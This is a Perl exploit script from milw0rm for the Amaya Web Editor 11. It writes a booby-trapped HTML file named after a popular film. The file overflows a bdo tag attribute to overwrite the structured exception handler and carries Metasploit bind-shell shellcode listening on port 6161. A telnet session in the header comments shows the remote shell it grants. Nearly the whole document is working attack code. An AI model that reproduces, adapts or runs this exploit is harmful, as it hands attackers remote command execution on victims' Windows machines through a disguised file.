#!/usr/bin/perl
#
# Title: Amaya Web Editor 11 Remote SEH Overwrite Exploit
#
# Summary: Amaya is a Web editor, i.e. a tool used to create and update documents directly on the Web.
#
# Product web page: http://www.w3.org/Amaya/
#
# Tested on Microsoft Windows XP Professional SP2 (English)
#
# Reference: http://www.milw0rm.com/exploits/7906
#
# Exploit coded by Gjoko 'LiquidWorm' Krstic
#
# liquidworm [t00t] gmail [w00t] com
#
# 30.01.2009
#
#------------------------------------------------------------------
#
# lqwrm@zeroscience:~$ telnet 192.168.1.101 6161
# Trying 192.168.1.101...
# Connected to 192.168.1.101.
# Escape character is '^]'.
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Amaya\WindowsWX\bin>dir
#  Volume in drive C is System
#  Volume Serial Number is D484-8540
#
#  Directory of C:\Program Files\Amaya\WindowsWX\bin
#
# 29.01.2009  19:27    <DIR>          .
# 29.01.2009  19:27    <DIR>          ..
# 16.12.2008  14:44         5.816.320 amaya.exe
# 16.12.2008  14:41         1.290.240 thotprinter.dll
# 19.08.2008  11:02           135.168 wxbase28u_net_vc_custom.dll
# 19.08.2008  11:01         1.220.608 wxbase28u_vc_custom.dll
# 19.08.2008  11:02           135.168 wxbase28u_xml_vc_custom.dll
# 19.08.2008  11:03           741.376 wxmsw28u_adv_vc_custom.dll
# 19.08.2008  11:03           286.720 wxmsw28u_aui_vc_custom.dll
# 19.08.2008  11:01         3.018.752 wxmsw28u_core_vc_custom.dll
# 19.08.2008  11:02            49.152 wxmsw28u_gl_vc_custom.dll
# 19.08.2008  11:02           524.288 wxmsw28u_html_vc_custom.dll
# 19.08.2008  11:03           593.920 wxmsw28u_xrc_vc_custom.dll
#              11 File(s)     13.811.712 bytes
#               2 Dir(s)   7.520.141.312 bytes free
#
# C:\Program Files\Amaya\WindowsWX\bin>
#
#------------------------------------------------------------------



my $start = "<html>" . "\n" . '<bdo dir="' . "\n";

my $junk = "\x41" x 10556;

my $seh = "\xc5\x87\x85\x7c";	#0x7c8587c5     pop pop ret kernel32.dll - (SE handler) - EIP
				#0x7c941eed     jmp esp kernel32.dll
				#0x7c836960      call esp kernel32.dll
				#0x7c85d568      call esp kernell32.dll
				# ...

my $next_seh = "\xeb\x06\x90\x90";	#0x909006eb     jmp+0x06 - (Pointer to next SEH record)

my $nop = "\x90" x 50;

# win32_bind -  EXITFUNC=seh LPORT=6161 Size=344 Encoder=PexFnstenvSub http://metasploit.com
my $sc = "\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb0".
	"\x6b\x3a\x1e\x83\xeb\xfc\xe2\xf4\x4c\x01\xd1\x53\x58\x92\xc5\xe1".
	"\x4f\x0b\xb1\x72\x94\x4f\xb1\x5b\x8c\xe0\x46\x1b\xc8\x6a\xd5\x95".
	"\xff\x73\xb1\x41\x90\x6a\xd1\x57\x3b\x5f\xb1\x1f\x5e\x5a\xfa\x87".
	"\x1c\xef\xfa\x6a\xb7\xaa\xf0\x13\xb1\xa9\xd1\xea\x8b\x3f\x1e\x36".
	"\xc5\x8e\xb1\x41\x94\x6a\xd1\x78\x3b\x67\x71\x95\xef\x77\x3b\xf5".
	"\xb3\x47\xb1\x97\xdc\x4f\x26\x7f\x73\x5a\xe1\x7a\x3b\x28\x0a\x95".
	"\xf0\x67\xb1\x6e\xac\xc6\xb1\x5e\xb8\x35\x52\x90\xfe\x65\xd6\x4e".
	"\x4f\xbd\x5c\x4d\xd6\x03\x09\x2c\xd8\x1c\x49\x2c\xef\x3f\xc5\xce".
	"\xd8\xa0\xd7\xe2\x8b\x3b\xc5\xc8\xef\xe2\xdf\x78\x31\x86\x32\x1c".
	"\xe5\x01\x38\xe1\x60\x03\xe3\x17\x45\xc6\x6d\xe1\x66\x38\x69\x4d".
	"\xe3\x38\x79\x4d\xf3\x38\xc5\xce\xd6\x03\x22\x0f\xd6\x38\xb3\xff".
	"\x25\x03\x9e\x04\xc0\xac\x6d\xe1\x66\x01\x2a\x4f\xe5\x94\xea\x76".
	"\x14\xc6\x14\xf7\xe7\x94\xec\x4d\xe5\x94\xea\x76\x55\x22\xbc\x57".
	"\xe7\x94\xec\x4e\xe4\x3f\x6f\xe1\x60\xf8\x52\xf9\xc9\xad\x43\x49".
	"\x4f\xbd\x6f\xe1\x60\x0d\x50\x7a\xd6\x03\x59\x73\x39\x8e\x50\x4e".
	"\xe9\x42\xf6\x97\x57\x01\x7e\x97\x52\x5a\xfa\xed\x1a\x95\x78\x33".
	"\x4e\x29\x16\x8d\x3d\x11\x02\xb5\x1b\xc0\x52\x6c\x4e\xd8\x2c\xe1".
	"\xc5\x2f\xc5\xc8\xeb\x3c\x68\x4f\xe1\x3a\x50\x1f\xe1\x3a\x6f\x4f".
	"\x4f\xbb\x52\xb3\x69\x6e\xf4\x4d\x4f\xbd\x50\xe1\x4f\x5c\xc5\xce".
	"\x3b\x3c\xc6\x9d\x74\x0f\xc5\xc8\xe2\x94\xea\x76\x40\xe1\x3e\x41".
	"\xe3\x94\xec\xe1\x60\x6b\x3a\x1e";

my $end = '">' . "\n" . "t00t</bdo>" . "\n" . "</html>";

my $file= "Slumdog_Millionaire.html";

$payload = "$start" . "$junk" . "$next_seh" . "$seh" . "$nop" . "$sc " . "$end";

open (exploit, ">./$file") or die "Can't open $file: $!";

print exploit "$payload";

close (exploit);

print "\t\n - $file successfully created!\n";

# milw0rm.com [2009-01-30]
